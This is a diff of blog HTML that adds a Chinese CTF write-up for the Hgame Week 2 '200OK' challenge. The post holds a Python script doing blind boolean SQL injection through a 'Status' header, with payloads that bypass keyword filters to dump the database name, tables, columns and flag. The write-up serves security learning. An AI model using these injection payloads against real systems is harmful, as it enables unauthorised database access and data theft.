@@ -71,12 +71,12 @@
 
   <!-- Pygments Highlight CSS -->
   
-<link rel="stylesheet" href="../css/highlight.css">
-<link rel="stylesheet" href="../css/widget.css">
-<link rel="stylesheet" href="../css/rocket.css">
-<link rel="stylesheet" href="../css/signature.css">
-<link rel="stylesheet" href="../css/catalog.css">
-<link rel="stylesheet" href="../css/livemylife.css">
+<link rel="stylesheet" href="../../../../css/highlight.css">
+<link rel="stylesheet" href="../../../../css/widget.css">
+<link rel="stylesheet" href="../../../../css/rocket.css">
+<link rel="stylesheet" href="../../../../css/signature.css">
+<link rel="stylesheet" href="../../../../css/catalog.css">
+<link rel="stylesheet" href="../../../../css/livemylife.css">
 
 
   
@@ -138,10 +138,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://yoursite-url/categories/">
+  <link rel="canonical" href="http://yoursite-url/2021/02/28/Hgame-Week2-Web-200OK/">
   <title>
     
-    Categories - gungnir | 九日
+    Hgme-Week2-Web-200OK! - gungnir | 九日
     
   </title>
 <meta name="generator" content="Hexo 4.2.1"></head>
@@ -289,8 +289,8 @@
 
   <style type="text/css">
     header.intro-header {
-       /*page*/
-        background-image: url('/img/header_img/categories_bg.jpg');
+       /*post*/
+        background-image: url('/img/header_img/lml_bg.jpg');
       
     }
 
@@ -312,10 +312,42 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>Categories</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">Hi , here is Categories ....</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#CTF" title="CTF">CTF</a>
+              
+            </div>
+            <h1>Hgme-Week2-Web-200OK!</h1>
+            <h2 class="subheading">CTF</h2>
+            <span class="meta">
+              Posted by gungnir on
+              2021-02-28
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">1</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">251</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+            <!-- 不蒜子统计 start -->
+            <span class="meta" id="busuanzi_container_page_pv">
+              Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+            </span>
+            <!-- 不蒜子统计 end -->
+            
+
+
           </div>
           
         </div>
@@ -356,143 +388,265 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-	<!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-      <!-- 标签云 -->
-      <div id='tag_cloud' class="tags">
+	<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
+
+        <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>题目是sql注入，抓到包后，可以看到status字段是由数据库回显的，所以使用脚本爆破就行，fuzz后可以写出有用的脚本</p>
+<p>这里我自己写了个脚本，但是不如师傅们写的，所以呢，我这里贴出师傅们的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">'https://200ok.liki.link/server.php'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line">dict = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        <span class="comment">#爆库名</span></span><br><span class="line">        <span class="comment">#payload = '''1'/**/or/**/ord(substr(database(),&#123;&#125;,1))=ord('&#123;&#125;')#'''.format(i,chr(ord(j)))</span></span><br><span class="line">        <span class="comment">#爆表名</span></span><br><span class="line">        <span class="comment">#payload = '''1'/**/or/**/ord(substr((SELEct/**/TABle_name/**/FRom/**/INFORMAtion_SCHEma.TABles/**/WHere/**/TABle_SCHEma=database()/**/LIMiT/**/0,1),&#123;&#125;,1))=ord('&#123;&#125;')#'''.format(i,chr(ord(j)))</span></span><br><span class="line">        <span class="comment">#爆列名</span></span><br><span class="line">        <span class="comment">#payload = '''1'/**/or/**/ord(substr((SELEct/**/Column_name/**/FRom/**/INFORMAtion_SCHEma.columns/**/WHere/**/TABle_NAMe='f1111111144444444444g'/**/LIMiT/**/0,1),&#123;&#125;,1))=ord('&#123;&#125;')#'''.format(i,chr(ord(j)))</span></span><br><span class="line">        <span class="comment">#爆flag</span></span><br><span class="line">        <span class="comment">#payload = '''1'/**/or/**/ord(substr((SELEct/**/ffffff14gggggg/**/FRom/**/week2sqli.f1111111144444444444g/**/LIMiT/**/0,1),&#123;&#125;,1))=ord('&#123;&#125;')#'''.format(i,chr(ord(j)))</span></span><br><span class="line">        hd = &#123;</span><br><span class="line">            <span class="string">'Status'</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        ra = s.get(url=url,headers=hd).text</span><br><span class="line">        <span class="comment">#print(j)</span></span><br><span class="line">        <span class="comment">#print(hd)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'HTTP 200 OK'</span> <span class="keyword">in</span> ra:</span><br><span class="line">            <span class="comment">#print(ra)</span></span><br><span class="line">            print(j)</span><br><span class="line">            ans += j</span><br><span class="line">            print(ans)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
+          
+          <li class="previous">
+            <a href="/2021/02/28/Hgame-Week2-Web-forgetful/" data-toggle="tooltip" data-placement="top" title="Hgame-Week2-Web-forgetful">&larr; Previous Post</a>
+          </li>
+          
+          
+          <li class="next">
+            <a href="/2021/02/28/Hgame-Week2-Web-Liki的生日礼物/" data-toggle="tooltip" data-placement="top" title="Hgme-Week2-Web-Liki的生日礼物">Next Post &rarr;</a>
+          </li>
+          
+        </ul>
+
         
-        <a href="#Hexo-Theme-LiveMyLife" title="Hexo-Theme-LiveMyLife" rel="1">Hexo-Theme-LiveMyLife</a>
+        <!-- tip start -->
+        <div class="tip">
+          <p>
+            If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
+          </p>
+        </div>
+        <!-- tip end -->
         
-        <a href="#CTF" title="CTF" rel="3">CTF</a>
+
         
-        <a href="#Wifi" title="Wifi" rel="1">Wifi</a>
+        <!-- Sharing Srtart -->
+        <!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
+
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=Hgme-Week2-Web-200OK!&body=Hi,I found this website and thought you might like it http://yoursite-url/2021/02/28/Hgame-Week2-Web-200OK/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+        <!-- Sharing End -->
         
+        <hr>
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+<!-- gitalk start -->
+<!-- Docs:https://github.com/gitalk/gitalk/blob/master/readme-cn.md -->
+
+<div id="gitalk-container"></div>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.js"></script> -->
+<script src="/js/comment/gitalk.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '',
+    clientSecret: '',
+    repo: '',
+    owner: '',
+    admin: '',
+    id: 'Sun Feb 28 2021 09:08:03 GMT+0800', // Ensure uniqueness and length less than 50
+    distractionFreeMode: false, // Facebook-like distraction free mode
+    perPage: 10 ,
+    pagerDirection: 'last',
+    createIssueManually: false ,
+    language: 'zh-CN'
+  });
+  gitalk.render('gitalk-container');
+
+  var gtFolded = () => {
+    setTimeout(function() {
+      let markdownBody = document.getElementsByClassName("markdown-body");
+      let list = Array.from(markdownBody);
+      list.forEach(item => {
+        if (item.clientHeight > 250) {
+          item.classList.add('gt-comment-body-folded');
+          item.style.maxHeight = '250px';
+          item.title = 'Click to Expand';
+          item.onclick = function() {
+            item.classList.remove('gt-comment-body-folded');
+            item.style.maxHeight = '';
+            item.title = '';
+            item.onclick = null;
+          };
+        }
+      })
+    }, 800);
+  }
+</script>
+
+<!-- gitalk end -->
+
+
+
+<!-- 2. gitment comment -->
+
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <hr>
+
       </div>
 
-      <!-- 标签列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-tag listing-seperator" id="Hexo-Theme-LiveMyLife">
-          <span class="tag-text">Hexo-Theme-LiveMyLife</span>
-        </span>
-        
-        <!-- <li class="listing-item">
-                  <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-                  <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-                  </li> -->
-        <div class="post-preview">
-          <a href="/2020/04/17/Hexo-Theme-LiveMyLife/">
-            <h2 class="post-title">
-              Hexo-Theme-LiveMyLife
-            </h2>
-            
-            <h3 class="post-subtitle">
-              A succinct hexo theme...
-            </h3>
-            
-          </a>
-          <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </div>
-        <hr>
-        
-      </div>
-      
-      <div class="one-tag-list">
-        <span class="fa fa-tag listing-seperator" id="CTF">
-          <span class="tag-text">CTF</span>
-        </span>
-        
-        <!-- <li class="listing-item">
-                  <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-                  <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-                  </li> -->
-        <div class="post-preview">
-          <a href="/2021/02/28/Hgame-Week2-Web-200OK/">
-            <h2 class="post-title">
-              Hgme-Week2-Web-200OK!
-            </h2>
-            
-            <h3 class="post-subtitle">
-              CTF
-            </h3>
-            
-          </a>
-          <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </div>
-        <hr>
-        
-        <!-- <li class="listing-item">
-                  <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-                  <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-                  </li> -->
-        <div class="post-preview">
-          <a href="/2021/02/28/Hgame-Week2-Web-Liki的生日礼物/">
-            <h2 class="post-title">
-              Hgme-Week2-Web-Liki的生日礼物
-            </h2>
-            
-            <h3 class="post-subtitle">
-              WP
-            </h3>
-            
-          </a>
-          <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </div>
-        <hr>
-        
-        <!-- <li class="listing-item">
-                  <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-                  <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-                  </li> -->
-        <div class="post-preview">
-          <a href="/2021/02/28/Hgame-Week2-Web-forgetful/">
-            <h2 class="post-title">
-              Hgame-Week2-Web-forgetful
-            </h2>
-            
-            <h3 class="post-subtitle">
-              CTF
-            </h3>
-            
-          </a>
-          <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </div>
-        <hr>
-        
-      </div>
-      
-      <div class="one-tag-list">
-        <span class="fa fa-tag listing-seperator" id="Wifi">
-          <span class="tag-text">Wifi</span>
-        </span>
-        
-        <!-- <li class="listing-item">
-                  <time datetime="{{ post.date | date:"%Y-%m-%d" }}">{{ post.date | date:"%Y-%m-%d" }}</time>
-                  <a href="{{ post.url }}" title="{{ post.title }}">{{ post.title }}</a>
-                  </li> -->
-        <div class="post-preview">
-          <a href="/2021/02/26/aircrack-ng破解wifi/">
-            <h2 class="post-title">
-              aircrack-ng破解wifi
-            </h2>
-            
-            <h3 class="post-subtitle">
-              A succinct hexo theme...
-            </h3>
-            
-          </a>
-          <!-- <p class="post-meta">{{ post.date | date:"%Y-%m-%d" }}</p> -->
-        </div>
-        <hr>
-        
-      </div>
-      
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
 
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#题解"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">题解</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+      <!-- Sidebar Container -->
+      <div class="
+                col-lg-8 col-lg-offset-1
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+        <!-- Featured Tags -->
+        
+        <section>
+          <!-- no hr -->
+          <h5>
+            <a href="/tags/">FEATURED TAGS</a>
+          </h5>
+          <div class="tags">
+            
+            <a class="tag" href="/tags/#CTF" title="CTF">CTF</a>
+            
+          </div>
+        </section>
+        
+
+        <!-- Friends Blog -->
+        
+        <hr>
+        <h5>FRIENDS</h5>
+        <ul class="list-inline">
+
+          
+          <li>
+            <a href="http://poilzero.sipc115.club/" target="_blank">poilzero</a>
+          </li>
+          
+          <li>
+            <a href="https://www.515code.com/" target="_blank">铭大佬</a>
+          </li>
+          
+          <li>
+            <a href="http://www.xcy1010.cn/" target="_blank">徐晨阳</a>
+          </li>
+          
+          <li>
+            <a href="http://derait.sipc115.club/" target="_blank">陈泓盛</a>
+          </li>
+          
+        </ul>
+        
+      </div>
     </div>
   </div>
-</div>
+</article>
+
+
+
+<!-- anchorjs start -->
+<!-- async load function -->
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script type="text/javascript">
+  // async load function
+  function async (u, c) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) {
+      o.addEventListener('load', function(e) {
+        c(null, e);
+      }, false);
+    }
+    s.parentNode.insertBefore(o, s);
+  };
+</script>
+<script type="text/javascript">
+  //anchor-js, Doc:http://bryanbraun.github.io/anchorjs/
+  async ("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js", function() {
+    anchors.options = {
+      visible: 'hover',
+      placement: 'left',
+      // icon: 'ℬ'
+      icon: '❡'
+    };
+    anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+  });
+</script>
+<style>
+  /* place left on bigger screen */
+  @media all and (min-width: 800px) {
+    .anchorjs-link {
+      position: absolute;
+      left: -0.75em;
+      font-size: 1.1em;
+      margin-top: -0.1em;
+    }
+  }
+</style>
+
+<!-- anchorjs end -->
+
 
 
 	<!-- Footer (contains ThemeColor、viewer) -->
